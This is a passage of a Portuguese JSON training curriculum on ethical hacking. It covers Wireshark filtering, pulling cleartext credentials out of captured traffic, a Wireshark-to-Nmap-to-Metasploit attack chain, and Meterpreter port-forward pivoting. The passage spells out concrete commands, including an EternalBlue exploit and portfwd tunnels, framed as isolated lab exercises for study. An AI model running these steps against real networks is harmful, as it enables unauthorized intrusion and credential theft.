                                  "verification": "Aplicar 3 filtros diferentes e capturar screenshots mostrando redução de ruído >70%.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Wireshark",
                                    "Arquivos PCAP de amostra (baixe de Wireshark wiki)",
                                    "Capturas de tela"
                                  ],
                                  "tips": "Aplique filtro, salve a seleção como 'Display Filter' para reutilizar; use 'Find Packet' para navegar.",
                                  "learningObjective": "Criar e aplicar filtros de display para isolar protocolos específicos em análises.",
                                  "commonMistakes": [
                                    "Filtros muito amplos que não reduzem ruído",
                                    "Esquecer de clicar Apply",
                                    "Confundir src/dst em filtros IP"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar e Usar Filtros de Captura",
                                  "subSteps": [
                                    "Iniciar nova captura em interface de rede ativa (ex: Wi-Fi ou Ethernet).",
                                    "No Capture Options, inserir filtro BPF como 'tcp port 80' e iniciar.",
                                    "Gerar tráfego HTTP (navegar em sites) e parar captura após 1 minuto.",
                                    "Comparar captura filtrada vs. não filtrada em termos de tamanho e ruído.",
                                    "Testar filtro avançado: 'host 8.8.8.8 and udp' para DNS queries."
                                  ],
                                  "verification": "Realizar captura filtrada com <1000 pacotes para tráfego de 2 minutos, confirmando foco em protocolo alvo.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Wireshark com privilégios admin",
                                    "Conexão de rede ativa",
                                    "Sites de teste como example.com"
                                  ],
                                  "tips": "Capture em loopback ou VM para tráfego controlado; verifique 'Capture Filter' field antes de start.",
                                  "learningObjective": "Implementar capture filters para capturar apenas dados relevantes desde o início.",
                                  "commonMistakes": [
                                    "Filtros BPF inválidos param a captura",
                                    "Capturar em interface errada",
                                    "Não parar captura manualmente"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Combinar Filtros e Otimizar Análises para Reduzir Ruído",
                                  "subSteps": [
                                    "Combinar capture filter 'port 80' com display 'http contains \"login\"'.",
                                    "Analisar estatísticas (Statistics > Conversations) pré e pós-filtros.",
                                    "Criar filtro personalizado para cenário: tráfego suspeito (ex: 'tcp.flags.syn==1 and tcp.window_size==0').",
                                    "Exportar resultados filtrados e documentar redução de ruído.",
                                    "Simular análise em ethical hacking: focar em pivoting (portas SMB/445)."
                                  ],
                                  "verification": "Produzir relatório com antes/depois: redução >90% em pacotes irrelevantes.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Wireshark",
                                    "PCAPs complexos (ex: malware traffic samples)",
                                    "Template de relatório"
                                  ],
                                  "tips": "Use '&&' para AND, '||' para OR em display filters; salve filtros como bookmarks.",
                                  "learningObjective": "Integrar filtros para análises eficientes em cenários reais de segurança.",
                                  "commonMistakes": [
                                    "Filtros sobre-restritivos perdem dados úteis",
                                    "Não validar com estatísticas",
                                    "Ignorar follow stream para contexto"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação de ataque cibernético, configure capture filter 'tcp port 4444' para capturar apenas tráfego de shell reverso (Metasploit), então aplique display filter 'tcp contains \"whoami\"' para isolar comandos executados, reduzindo milhões de pacotes de background para dezenas relevantes.",
                              "finalVerifications": [
                                "Criar e aplicar display filter 'http.request.method == \"POST\"' sem erros.",
                                "Executar capture filter 'udp port 53' capturando apenas DNS queries.",
                                "Combinar filtros reduzindo ruído em >80% em PCAP de 10MB.",
                                "Explicar sintaxe BPF vs. display em entrevista simulada.",
                                "Identificar tráfego HTTP em captura mista via filtro.",
                                "Salvar e reutilizar filtro personalizado."
                              ],
                              "assessmentCriteria": [
                                "Precisão dos filtros: zero falsos positivos/negativos em testes.",
                                "Eficiência: tempo de análise reduzido em 70% com filtros aplicados.",
                                "Variedade: domínio de pelo menos 5 protocolos diferentes.",
                                "Documentação: screenshots e explicações claras de cada filtro.",
                                "Otimização: uso de compostos e estatísticas para validação.",
                                "Autonomia: aplicação sem consulta a documentação em 80% dos casos."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos TCP/IP e camadas OSI.",
                                "Análise de Dados: Filtros semelhantes a queries SQL ou Pandas.",
                                "Programação: Expressões lógicas e sintaxe BPF (Berkeley Packet Filter).",
                                "Estatística: Análise de tráfego e redução de ruído via amostragem.",
                                "Inteligência Artificial: Pré-processamento de dados para ML em detecção de intrusões."
                              ],
                              "realWorldApplication": "Em operações cibernéticas e jogos de guerra, ethical hackers usam filtros Wireshark para isolar comunicações C2 de malware (ex: port 8080), detectar pivots laterais (SMB/445) e persistência (HTTP beacons), ignorando tráfego benigno e acelerando resposta a incidentes em redes empresariais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.1.3.1"
                            ]
                          },
                          {
                            "id": "10.1.6.1.3.3",
                            "name": "Análise Detalhada de Tráfego e Reconhecimento",
                            "description": "Inspecionar pacotes para identificar credenciais, protocolos não criptografados e padrões de tráfego indicativos de serviços expostos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configuração Inicial e Captura de Tráfego",
                                  "subSteps": [
                                    "Instale e abra o Wireshark em um ambiente de laboratório seguro.",
                                    "Selecione a interface de rede apropriada para capturar tráfego (ex: loopback ou VM).",
                                    "Aplique filtros de captura iniciais para focar em tráfego relevante (ex: host específico).",
                                    "Inicie a captura e gere tráfego de teste (ex: navegação HTTP não segura).",
                                    "Pare a captura após coletar amostras suficientes (pelo menos 100 pacotes)."
                                  ],
                                  "verification": "Verifique se o arquivo de captura (.pcap) contém pacotes visíveis na lista principal do Wireshark.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Wireshark instalado",
                                    "Ambiente de laboratório com VMs (ex: Metasploitable)",
                                    "Rede isolada"
                                  ],
                                  "tips": "Use captura em modo promiscuous apenas em labs para evitar questões legais.",
                                  "learningObjective": "Configurar Wireshark para capturar tráfego de rede de forma eficiente e segura.",
                                  "commonMistakes": [
                                    "Capturar em rede real sem permissão",
                                    "Não pausar captura, causando arquivos muito grandes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Filtragem e Navegação Básica nos Pacotes",
                                  "subSteps": [
                                    "Aplique filtros de exibição como 'http' ou 'tcp.port == 80' para isolar protocolos relevantes.",
                                    "Examine colunas como Source/Destination IP, Protocolo e Info para padrões iniciais.",
                                    "Use a árvore de pacotes para expandir frames Ethernet, IP e TCP/UDP.",
                                    "Siga streams TCP (TCP Stream > Follow > TCP Stream) para reconstruir sessões.",
                                    "Salve filtros úteis no painel de filtros para reutilização."
                                  ],
                                  "verification": "Confirme que filtros reduzem a lista para <50 pacotes relevantes e streams são reconstruídos corretamente.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Arquivo .pcap capturado no Step 1",
                                    "Lista de filtros Wireshark comuns"
                                  ],
                                  "tips": "Digite 'http contains \"password\"' para buscas rápidas em payloads.",
                                  "learningObjective": "Dominar filtros e navegação para isolar tráfego suspeito rapidamente.",
                                  "commonMistakes": [
                                    "Filtros incorretos levando a falsos negativos",
                                    "Ignorar campos como Length para detectar payloads grandes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificação de Credenciais e Protocolos Não Criptografados",
                                  "subSteps": [
                                    "Busque por protocolos como HTTP, FTP, Telnet usando filtros 'http' ou 'ftp'.",
                                    "Inspecione payloads em pacotes POST/GET para strings como 'password', 'user', 'pass'.",
                                    "Exporte objetos HTTP (File > Export Objects > HTTP) para arquivos legíveis.",
                                    "Analise campos como Authorization: Basic para credenciais Base64.",
                                    "Anote credenciais encontradas em um relatório estruturado."
                                  ],
                                  "verification": "Liste pelo menos 2 exemplos de credenciais ou dados sensíveis extraídos de pacotes.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Arquivo .pcap filtrado",
                                    "Ferramenta de decodificação Base64 online/offline"
                                  ],
                                  "tips": "Cor de fundo vermelha no Wireshark indica linhas sensíveis; configure alertas personalizados.",
                                  "learningObjective": "Detectar e extrair dados sensíveis em tráfego não criptografado.",
                                  "commonMistakes": [
                                    "Confundir dados criptografados com plaintext",
                                    "Não decodificar Base64 corretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Reconhecimento de Padrões de Tráfego para Serviços Expostos",
                                  "subSteps": [
                                    "Identifique padrões como portas abertas (ex: 22/SSH, 80/HTTP) via estatísticas (Statistics > Conversations).",
                                    "Analise handshakes iniciais SYN/ACK para serviços respondendo.",
                                    "Busque banners de serviço em respostas (ex: 'Apache/2.4' em HTTP).",
                                    "Correlacione tráfego com scans Nmap prévios para validação.",
                                    "Gere um mapa de serviços expostos baseado nos padrões observados."
                                  ],
                                  "verification": "Crie um relatório listando 3+ serviços expostos com evidências de pacotes.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Estatísticas Wireshark",
                                    "Scan Nmap complementar"
                                  ],
                                  "tips": "Use 'tcp.analysis.flags' para detectar anomalias como retransmissões indicativas de scans.",
                                  "learningObjective": "Reconhecer assinaturas de tráfego que revelam serviços e vulnerabilidades.",
                                  "commonMistakes": [
                                    "Ignorar tráfego multicast/broadcast",
                                    "Não considerar contexto temporal de picos de tráfego"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com Metasploitable 2, capture tráfego durante login FTP não criptografado. Filtre 'ftp', siga o stream e extraia usuário 'msfadmin' e senha 'msfadmin' de pacotes plaintext, identificando o serviço FTP exposto na porta 21.",
                              "finalVerifications": [
                                "Credenciais extraídas corretamente de pelo menos um protocolo não criptografado.",
                                "Lista de protocolos não seguros identificados (ex: HTTP, FTP).",
                                "Padrões de tráfego mapeados para 3+ serviços expostos.",
                                "Relatório gerado com screenshots de pacotes chave.",
                                "Filtros personalizados salvos e testados.",
                                "Nenhuma evidência de tráfego criptografado mal interpretado como plaintext."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de dados sensíveis (sem falsos positivos).",
                                "Eficiência nos filtros e tempo de análise (<90 minutos total).",
                                "Profundidade da análise de payloads e streams.",
                                "Qualidade do relatório com evidências visuais.",
                                "Compreensão demonstrada em conexões com ethical hacking.",
                                "Aplicação correta de verificações em cada step."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Entendimento de camadas OSI (3-7) em análise de pacotes.",
                                "Criptografia: Diferença entre TLS/SSL e plaintext.",
                                "Programação: Scripts Tshark para automação de filtros.",
                                "Análise de Dados: Uso de estatísticas Wireshark como ferramentas analíticas.",
                                "Ética: Discussão de legalidade em captura de tráfego."
                              ],
                              "realWorldApplication": "Durante pentests, analise tráfego capturado em redes corporativas para detectar credenciais vazadas em apps legados (ex: HTTP em intranet), expondo serviços como RDP desprotegido para priorizar remediações e prevenir breaches."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.1.3.2"
                            ]
                          },
                          {
                            "id": "10.1.6.1.3.4",
                            "name": "Integração com Outras Ferramentas",
                            "description": "Exportar dados do Wireshark para ferramentas como Nmap ou Metasploit, e seguir fluxos de ataque baseados em análise de tráfego.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Capturar e Analisar Tráfego Relevante no Wireshark",
                                  "subSteps": [
                                    "Inicie o Wireshark e selecione a interface de rede apropriada para captura.",
                                    "Aplique filtros de captura (ex: host 192.168.1.100) para focar em tráfego suspeito.",
                                    "Pare a captura após identificar pacotes úteis, como requisições HTTP ou TCP handshakes.",
                                    "Aplique filtros de exibição (ex: http.request) para isolar dados acionáveis como IPs, portas e payloads.",
                                    "Anote metadados chave: IPs de origem/destino, portas, protocolos e timestamps."
                                  ],
                                  "verification": "Lista de pacotes filtrados visível na interface do Wireshark com pelo menos 10 pacotes relevantes anotados.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Wireshark instalado",
                                    "Ambiente de rede de teste (ex: VM com Kali Linux)"
                                  ],
                                  "tips": "Use filtros compostos como 'ip.src == 192.168.1.1 and tcp.port == 80' para precisão.",
                                  "learningObjective": "Identificar e extrair dados de tráfego para integração com ferramentas de ataque.",
                                  "commonMistakes": [
                                    "Capturar tráfego excessivo sem filtros, sobrecarregando a análise; ignorar filtros de exibição pós-captura."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Exportar Dados do Wireshark em Formato Compatível",
                                  "subSteps": [
                                    "Selecione os pacotes relevantes (Ctrl+clique para múltiplos).",
                                    "Vá para File > Export > Objects > HTTP ou Export Packet Dissections > As CSV/PDML.",
                                    "Escolha formato: CSV para Nmap (IPs/portas), PDML/XML para Metasploit.",
                                    "Defina opções de exportação: inclua colunas como Source IP, Destination Port, Protocol.",
                                    "Salve o arquivo em localização acessível (ex: /home/user/wireshark_export.csv)."
                                  ],
                                  "verification": "Arquivo exportado aberto em editor de texto/visualizador confirmando dados corretos (IPs, portas preservados).",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Wireshark",
                                    "Editor de texto como Notepad++ ou VS Code"
                                  ],
                                  "tips": "Para Nmap, exporte como CSV com colunas 'ip.dst'; para Metasploit, prefira PDML.",
                                  "learningObjective": "Gerar exports padronizados de tráfego para importação em ferramentas externas.",
                                  "commonMistakes": [
                                    "Exportar formato incompatível (ex: pcap para Nmap); omitir colunas essenciais como portas."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Importar Dados em Ferramentas como Nmap ou Metasploit",
                                  "subSteps": [
                                    "Para Nmap: Use 'nmap -iL wireshark_export.txt --open' após converter CSV para lista de IPs.",
                                    "Para Metasploit: Carregue módulo auxiliar (ex: use auxiliary/scanner/portscan/tcp), importe via 'set RHOSTS' de arquivo.",
                                    "Parse o export manualmente se necessário (ex: grep IPs do CSV: grep -oE '\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b' file.csv > targets.txt).",
                                    "Configure parâmetros baseados na análise Wireshark (ex: portas identificadas).",
                                    "Execute scan inicial para validar importação."
                                  ],
                                  "verification": "Nmap/Metasploit mostram hosts/portas do Wireshark no output inicial do scan.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Nmap instalado",
                                    "Metasploit Framework (msfconsole)",
                                    "Ambiente Kali Linux"
                                  ],
                                  "tips": "Teste importação com 'nmap -iL file.txt -v' para verbose output e depuração.",
                                  "learningObjective": "Integrar dados Wireshark em workflows de scanning/exploit.",
                                  "commonMistakes": [
                                    "IPs mal formatados no input file; esquecer de converter portas para ranges no Nmap."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Executar Fluxo de Ataque e Documentar Resultados",
                                  "subSteps": [
                                    "Baseado em resultados Nmap, avance para Metasploit (ex: use exploit/multi/http/... com RHOSTS do scan).",
                                    "Simule pivoting: use dados de tráfego para rotear ataques internos.",
                                    "Monitore tráfego resultante de volta no Wireshark para loop de feedback.",
                                    "Documente chain: Wireshark capture > Export > Nmap scan > Metasploit exploit > Evidências.",
                                    "Limpe ambiente: delete arquivos temporários e pare serviços."
                                  ],
                                  "verification": "Relatório gerado com screenshots de cada etapa e sucesso no fluxo (ex: shell aberta no Metasploit).",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Metasploit",
                                    "Wireshark para monitoramento",
                                    "Ferramenta de screenshot como Flameshot"
                                  ],
                                  "tips": "Use 'db_nmap' no Metasploit para persistir resultados de scans.",
                                  "learningObjective": "Aplicar análise de tráfego em fluxos de ataque completos e iterativos.",
                                  "commonMistakes": [
                                    "Pular validação de portas abertas; não documentar chain para reprodutibilidade."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de pentest, capture tráfego de uma VM vulnerável (DVWA) acessando http://192.168.1.100/login.php. Exporte IPs/portas 80/443 para Nmap: nmap -iL targets.txt -p80,443. Use resultados para Metasploit sqlmap module, explorando SQLi baseado em payloads HTTP capturados.",
                              "finalVerifications": [
                                "Dados exportados do Wireshark importados corretamente em Nmap/Metasploit sem erros de parsing.",
                                "Scan Nmap identifica pelo menos 80% das portas/IPs do Wireshark.",
                                "Fluxo de ataque completa com evidência de exploração (ex: sessão Metasploit ativa).",
                                "Documentação inclui chain completo com timestamps e screenshots.",
                                "Loop de feedback: tráfego do ataque capturado e analisado no Wireshark.",
                                "Ambiente limpo: sem artefatos persistentes."
                              ],
                              "assessmentCriteria": [
                                "Precisão na extração/exportação de dados (100% match IPs/portas).",
                                "Eficiência do workflow (tempo total <90 minutos).",
                                "Completude da documentação (todas etapas com evidências).",
                                "Criatividade em fluxos de ataque baseados em tráfego real.",
                                "Segurança: uso apenas de labs isolados, sem exposição externa.",
                                "Análise de erros: identificação e correção de problemas comuns."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Entendimento profundo de protocolos TCP/IP e filtros BPF.",
                                "Programação: Scripts Bash/Python para parsing automatizado de exports.",
                                "Análise de Dados: Processamento CSV/XML com ferramentas como Pandas ou awk.",
                                "Gestão de Projetos: Documentação de chains de ataque para relatórios pentest.",
                                "Ética: Discussão de regras de engajamento em ethical hacking."
                              ],
                              "realWorldApplication": "Durante um Red Team engagement, analise tráfego C2 capturado no Wireshark, exporte IOCs para Nmap para mapear rede interna, pivote via Metasploit para persistência, simulando ataques APT em SOCs ou auditorias de conformidade."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.1.3.3",
                              "10.1.6.1.1.3",
                              "10.1.6.1.2.3"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.6.2",
                    "name": "Técnicas de Pivoting em Redes",
                    "description": "Métodos para utilizar sistemas comprometidos como pontos de pivô para acessar redes internas e hosts adicionais.",
                    "individualConcepts": [
                      {
                        "id": "10.1.6.2.1",
                        "name": "Pivoting via Port Forwarding",
                        "description": "Técnica que permite redirecionar tráfego de portas específicas de hosts internos através de um sistema comprometido atuando como pivô, facilitando o acesso a serviços não diretamente alcançáveis.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.2.1.1",
                            "name": "Configurar Port Forwarding no Meterpreter",
                            "description": "Utilizar comandos como 'portfwd add' no módulo Meterpreter do Metasploit para criar túneis de porta reversos ou locais, permitindo acesso a serviços internos como RDP ou SSH em hosts pivô.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente e Obter Sessão Meterpreter",
                                  "subSteps": [
                                    "Inicie o Metasploit Framework com 'msfconsole'.",
                                    "Configure e execute um exploit para ganhar acesso a uma sessão Meterpreter em um host pivô (ex: use eternalblue contra uma VM vulnerável).",
                                    "Interaja com a sessão usando 'sessions -i <ID>'.",
                                    "Execute 'sysinfo' e 'ifconfig' para confirmar controle no host pivô e identificar rede interna.",
                                    "Instale netcat ou telnet no atacante para testes posteriores."
                                  ],
                                  "verification": "Sessão Meterpreter ativa e responsiva; comandos como 'getuid' e 'shell' funcionam sem erros.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Metasploit Framework instalado",
                                    "VMs de lab (Kali Linux, Metasploitable, host pivô)",
                                    "Exploit configurado (ex: exploit/windows/smb/ms17_010_eternalblue)"
                                  ],
                                  "tips": "Use workspaces no Metasploit para organizar múltiplas sessões; sempre background sessões com Ctrl+Z.",
                                  "learningObjective": "Estabelecer uma sessão Meterpreter estável em um host pivô para habilitar técnicas avançadas de pivoting.",
                                  "commonMistakes": [
                                    "Falhar em background a sessão antes de interagir",
                                    "Usar IP errado no exploit",
                                    "Ignorar firewalls no lab"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar e Entender a Sintaxe do Comando Portfwd",
                                  "subSteps": [
                                    "Digite 'help portfwd' na sessão Meterpreter para ver opções.",
                                    "Execute 'portfwd list' para verificar regras existentes (deve estar vazio inicialmente).",
                                    "Estude parâmetros: 'add' para adicionar, '-l' porta local, '-p' porta remota, '-r' para reverse, '-L' host local, '-R' host remoto.",
                                    "Planeje cenários: local forwarding (acesso local para remoto) vs reverse (remoto para local).",
                                    "Anote exemplos: portfwd add -l 13389 -p 3389 -r 192.168.1.100."
                                  ],
                                  "verification": "Comando 'help portfwd' exibe sintaxe completa; usuário pode recitar parâmetros corretamente.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Sessão Meterpreter ativa",
                                    "Documentação Metasploit (offline PDF ou wiki)"
                                  ],
                                  "tips": "Use 'portfwd ?' para ajuda rápida; memorize L=local, R=remote para evitar confusão.",
                                  "learningObjective": "Dominar a sintaxe e opções do módulo portfwd para configuração precisa.",
                                  "commonMistakes": [
                                    "Confundir parâmetros -l com -p",
                                    "Esquecer de especificar IP remoto",
                                    "Não usar aspas em IPs com hífens"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Local Port Forwarding",
                                  "subSteps": [
                                    "Identifique um serviço interno no pivô (ex: SSH na porta 22 em 10.0.0.50).",
                                    "Execute 'portfwd add -l 10022 -p 22 -L 10.0.0.50' (túnel local 10022 -> remoto 22).",
                                    "Verifique com 'portfwd list' para confirmar regra ativa.",
                                    "Teste conectividade básica com 'netstat -an | grep 10022' no atacante.",
                                    "Tente conectar: ssh user@localhost -p 10022."
                                  ],
                                  "verification": "'portfwd list' mostra regra com status 'active'; conexão SSH via túnel succeeds.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Netcat/telnet instalado no atacante",
                                    "Serviço alvo rodando no host interno (ex: SSH)"
                                  ],
                                  "tips": "Escolha portas locais livres (>1024); use -h para ajuda inline.",
                                  "learningObjective": "Implementar port forwarding local para expor serviços internos via pivô.",
                                  "commonMistakes": [
                                    "Porta local em uso",
                                    "IP remoto inacessível do pivô",
                                    "Firewall bloqueando no pivô"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Reverse Port Forwarding e Testar",
                                  "subSteps": [
                                    "Planeje reverse: expor serviço atacante (RDP 3389) para rede pivô via 'portfwd add -r -R 0.0.0.0 -l 13389 -p 3389'.",
                                    "Execute o comando e verifique com 'portfwd list'.",
                                    "Do pivô ou outro host interno, teste: rdesktop 127.0.0.1:13389 ou telnet pivô_IP 13389.",
                                    "Monitore tráfego com 'portfwd flush' para limpar após teste.",
                                    "Documente logs de sucesso/erro."
                                  ],
                                  "verification": "Conexão reverse succeeds de host interno; 'portfwd list' atualizado corretamente.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Serviço RDP/SSH no atacante",
                                    "Cliente RDP/telnet no host interno"
                                  ],
                                  "tips": "Use 0.0.0.0 para bind em todas interfaces no reverse; teste imediatamente após add.",
                                  "learningObjective": "Configurar e validar port forwarding reverso para cenários de pivoting bidirecional.",
                                  "commonMistakes": [
                                    "Esquecer flag -r",
                                    "Bind errado com -L/-R",
                                    "Não flush regras antigas"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Verificar, Limpar e Documentar",
                                  "subSteps": [
                                    "Execute 'portfwd list' e 'portfwd delete [ID]' ou 'portfwd flush' para remover.",
                                    "Confirme remoção com 'netstat' e tentativas de conexão falhando.",
                                    "Registre comandos usados, IPs, portas e resultados em relatório.",
                                    "Teste persistência: reinicie sessão e verifique se regras sobrevivem (não sobrevivem).",
                                    "Explore alternativas como autoroute para pivoting SOCKS."
                                  ],
                                  "verification": "Nenhuma regra em 'portfwd list'; conexões antigas falham; relatório completo.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Editor de texto para relatório",
                                    "Ferramentas de monitoramento (tcpdump opcional)"
                                  ],
                                  "tips": "Sempre flush no fim da sessão para evitar vazamentos; integre com msfvenom para persistência.",
                                  "learningObjective": "Garantir limpeza segura e documentação para operações profissionais.",
                                  "commonMistakes": [
                                    "Deixar regras ativas pós-teste",
                                    "Não testar remoção",
                                    "Relatório incompleto"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de pentest: Kali (atacante 192.168.1.100) explora pivô Windows (10.0.0.10) via Meterpreter. Configure local fwd: 'portfwd add -l 10022 -p 22 -L 10.0.0.50' para acessar SSH interno em 10.0.0.50:22 via localhost:10022. Teste: ssh user@127.0.0.1 -p 10022. Para reverse, exponha RDP Kali: 'portfwd add -r -R 0.0.0.0 -l 13389 -p 3389', conecte de interno: rdesktop 10.0.0.10:13389.",
                              "finalVerifications": [
                                "'portfwd list' exibe todas regras configuradas corretamente com status active.",
                                "Conexões via túneis succeeds sem timeouts ou erros de porta.",
                                "Netstat confirma listening na porta local.",
                                "Remoção com 'portfwd delete' ou flush limpa lista completamente.",
                                "Logs Meterpreter sem erros de bind ou conexão.",
                                "Teste bidirecional (local e reverse) funcional."
                              ],
                              "assessmentCriteria": [
                                "Sintaxe precisa do comando portfwd sem erros de parâmetro.",
                                "Seleção correta de local vs reverse baseado no cenário.",
                                "Verificação imediata pós-configuração com list.",
                                "Testes de conectividade bem-sucedidos em ambos sentidos.",
                                "Limpeza completa de regras ao final.",
                                "Documentação clara de comandos e resultados."
                              ],
                              "crossCurricularConnections": [
                                "Networking: Conceitos de NAT, túneis SOCKS e proxy reverso.",
                                "Sistemas Operacionais: Comandos netstat, iptables e firewall rules.",
                                "Programação: Scripts Ruby em Metasploit para automação de portfwd.",
                                "Segurança: Integração com autoroute e socks proxy para pivoting avançado.",
                                "Análise de Rede: Uso de Wireshark para inspecionar tráfego tunelado."
                              ],
                              "realWorldApplication": "Em operações de Red Team ou pentests certificados (ex: OSCP), use portfwd no Meterpreter para pivotar em redes segmentadas, acessando RDP/SSH/VNC atrás de firewalls, permitindo exploração profunda sem detecção direta do C2."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.2.1.2",
                            "name": "Testar Conectividade via Port Forwarding",
                            "description": "Verificar a conectividade estabelecida através do túnel de port forwarding utilizando ferramentas como nmap ou telnet para escanear e conectar em portas redirecionadas no host pivô.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Confirmar Configuração e Atividade do Túnel de Port Forwarding",
                                  "subSteps": [
                                    "Execute comandos como 'netstat -tuln' ou 'ss -tuln' no host pivô para listar portas em escuta.",
                                    "Verifique se a porta forwardada (ex: localhost:8080) está listada e associada ao processo correto.",
                                    "Confira logs do túnel (ex: output do ssh -L ou proxychains) para ausência de erros de conexão.",
                                    "Teste conectividade básica local com 'ping' ou 'nc -zv localhost <porta>' se aplicável.",
                                    "Documente o mapeamento: origem (host interno:porta) -> destino (localhost:porta_forward)."
                                  ],
                                  "verification": "Porta forwardada aparece em escuta sem erros nos logs e testes locais respondem positivamente.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Terminal no host atacante",
                                    "Ferramentas: netstat/ss/nc instaladas (Kali Linux)",
                                    "Acesso SSH ao pivô"
                                  ],
                                  "tips": "Use 'watch -n 1 ss -tuln' para monitorar em tempo real mudanças no estado das portas.",
                                  "learningObjective": "Identificar e validar se o túnel de port forwarding está operacional antes de testes avançados.",
                                  "commonMistakes": [
                                    "Ignorar firewalls locais bloqueando portas",
                                    "Confundir portas locais com remotas",
                                    "Não checar processos competindo pela porta"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Escanear Portas Forwardadas com Nmap",
                                  "subSteps": [
                                    "Inicie nmap no host atacante: 'nmap -p <porta_forward> --reason localhost' para scan rápido.",
                                    "Adicione opções como '-sV' para detecção de versão e '-sC' para scripts default se necessário.",
                                    "Analise output: procure por 'open' state, service info e tempo de resposta.",
                                    "Compare resultados com portas esperadas do host interno (ex: 80, 445).",
                                    "Salve output: 'nmap -oN scan_results.txt ...' para registro."
                                  ],
                                  "verification": "Nmap reporta porta como 'open' com service correto e sem 'filtered' ou timeouts excessivos.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Nmap instalado",
                                    "Terminal",
                                    "Arquivo de portas alvo (ex: portas.txt)"
                                  ],
                                  "tips": "Use '-Pn' se host responde mas portas parecem filtered por evasão de firewall.",
                                  "learningObjective": "Dominar uso de nmap para validar conectividade através de túneis sem exposição excessiva.",
                                  "commonMistakes": [
                                    "Scan agressivo alertando IDS",
                                    "Porta errada especificada",
                                    "Ignorar --reason para causas de falha"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Testar Conectividade Interativa com Telnet ou Netcat",
                                  "subSteps": [
                                    "Inicie telnet: 'telnet localhost <porta_forward>' e observe banner ou resposta.",
                                    "Para portas não-TCP ou binárias, use 'nc -zv localhost <porta_forward>' para teste simples.",
                                    "Envie comandos básicos se serviço responder (ex: HTTP GET / em porta 80).",
                                    "Monitore timeouts ou refusals, ajustando com 'timeout 10 nc ...'.",
                                    "Registre screenshots ou logs de sessão bem-sucedida."
                                  ],
                                  "verification": "Conexão estabelece, banner/service responde e sessão fecha sem crashes abruptos.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Telnet ou nc/netcat",
                                    "Terminal interativo"
                                  ],
                                  "tips": "Prefira nc sobre telnet para versatilidade em portas UDP ou não-interativas.",
                                  "learningObjective": "Executar testes manuais de conectividade para confirmar acessibilidade além de scans passivos.",
                                  "commonMistakes": [
                                    "Telnet em portas não-echo (ex: HTTPS)",
                                    "Não capturar output para evidência",
                                    "Timeouts longos expondo a detecção"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Resultados, Troubleshoot e Documentar",
                                  "subSteps": [
                                    "Compare scans e testes: portas open no nmap conectam no telnet?",
                                    "Troubleshoot falhas: rechecar túnel, firewalls (iptables -L), SELinux/AppArmor.",
                                    "Meça latência com 'nmap --stats-every 10s' ou time em comandos.",
                                    "Gere relatório: inclua comandos, outputs, screenshots e conclusões.",
